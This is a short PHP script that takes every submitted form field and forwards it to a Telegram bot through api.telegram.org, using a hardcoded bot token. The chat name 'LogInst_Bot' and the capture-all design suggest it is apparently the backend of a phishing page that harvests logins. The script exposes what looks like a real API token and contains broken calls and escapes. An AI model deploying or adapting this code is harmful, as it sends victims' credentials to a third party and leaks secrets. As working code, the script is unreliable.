<?php
$content='';
foreach($_POST as $key => $value)
{
    if($value)
    {
        $content .="<b>$key</b>: <i>$value</i>/n";
        
    }
}
if(trim($content))
{
    $content="<b>Message from site:</b>\n".$content;
    //your bot token from@botfather
    $apiToken="6529423612:AAEffKgJiK0RMsM24nst3oQsqCeYjWm6XAY";
    $data=[
        //the user that you want to send a message
        'chat_id' =>'LogInst_Bot',
        'text' =>$content,
        'parse_mode' =>'HTML'
    ];
    $response=file_get_content("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
}
?>